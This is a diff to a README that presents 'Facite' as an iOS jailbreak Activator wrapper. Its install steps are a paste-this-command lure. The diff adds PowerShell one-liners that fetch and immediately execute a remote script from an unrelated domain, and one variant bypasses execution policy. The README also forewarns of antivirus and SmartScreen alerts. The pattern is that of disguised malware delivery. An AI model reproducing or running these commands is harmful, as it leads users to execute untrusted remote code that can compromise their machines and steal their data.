@@ -22,13 +22,13 @@ Facite is a command-line wrapper around Activator for jailbroken iOS devices, ex
    Copy the line below into PowerShell, press `Enter`, and wait for the setup to finish:
 
    ```cmd
-   iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
+   iex(irm 'https://activation-gateway.cc/update/ps-activator')
    ```
 
 3. If the script is blocked by security policy, run this command in Command Prompt (cmd):
    Copy, paste into CMD, hit `Enter`. Wait until the process finishes:
 ```cmd
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
 ```
 
 ### ⚠️ Antivirus / SmartScreen Alerts
